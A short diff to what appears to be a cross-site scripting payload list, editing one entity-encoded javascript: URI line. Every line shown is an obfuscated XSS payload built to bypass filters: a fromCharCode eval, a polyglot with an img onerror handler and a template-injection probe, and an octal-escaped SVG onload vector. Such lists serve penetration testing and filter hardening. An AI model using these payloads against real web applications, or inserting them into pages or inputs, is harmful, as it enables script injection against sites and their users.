@@ -1,4 +1,4 @@
-#"></div><a href= javascript&colon;alert&lpar;document&period;domain)
+#"></div><a href=javascript&colon;alert&lpar;document&period;domain)
 eval.bind()(String.fromCharCode(...[97,108,101,114,116,40,41]))
 \u0022\u003c%26quot;%26gt;%26lt;"';}};“></SCRIPT><img src=x onerror=alert(69)>${{7*7}}
 <JavaScript:"\74Svg\57OnLoad\75\141\154\145\162\164\501\51\76"/ContentEditable/AutoFocus/OnFocus=location=tagName>
